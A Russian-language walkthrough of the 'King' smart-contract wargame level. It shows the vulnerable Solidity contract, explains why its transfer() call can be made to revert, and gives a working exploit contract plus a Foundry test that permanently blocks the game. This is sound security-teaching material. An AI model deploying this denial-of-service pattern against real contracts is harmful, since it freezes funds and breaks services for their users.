# 9. King
Контракт представляет из себя игру в формате финансовой пирамиды: если кто-то отправляет количество эфира, большее чем текущий приз, тот становится новым королем. Свергнутый король получает новый приз, зарабатывая немного эфира.
Кроме того, логика контракта позволяет его владельцу самопровозгласить себя королем без выполнения условий игры.

Код контракта `King.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
Можно заметить, что в принимающей функции `receive()` используется метод `address.transfer()` для передачи нового приза свергнутому королю.
Этот метод отправляет переданное количество эфира на адрес, но при неудаче выдает ошибку, из-за чего его не рекомендуется использовать.

Чтобы предотвратить самопровозглашение, нужно не дать выполниться строчке `king = msg.sender`, которая идет после `address.transfer()`, следовательно, нужно, чтобы вызов метода инициировал ошибку. Может произойти это, например, при невозможности отправить эфир на адрес.
Такая ситуация, может быть, например, если королем будет являться контракт без принимающих эфир функций `receive()` или `fallback()`. 

Контракт эксплойта `KingExploit.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingExploit {
    constructor(address target) payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Attack failed");
    }
}
```

Тест контракта эксплойта `KingExploit.t.sol`:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {King} from "src/King/King.sol";
import {KingExploit} from "src/King/KingExploit.sol";

contract KingExploitTest is Test {
    King public target;
    KingExploit public exploit;

    address public owner = makeAddr("owner");
    address public attacker = makeAddr("attacker");
    uint256 amount = 1 ether;

    function setUp() public {
        vm.deal(owner, amount);
        vm.startPrank(owner);
        target = new King{value: owner.balance}();
        vm.stopPrank();

        vm.deal(attacker, amount * 2);
    }

    function test__Exploit() public {
        assertEq(target._king(), owner);

        vm.startPrank(attacker);
        exploit = new KingExploit{value: attacker.balance}(address(target));
        vm.stopPrank();

        assertEq(target._king(), address(exploit));

        vm.deal(owner, amount * 3);
        vm.expectRevert();
        vm.startPrank(owner);
        (bool success, ) = address(target).call{value: owner.balance}("");
        if (!success) {
            revert("NotSuccess");
        }
        vm.stopPrank();
    }
}
```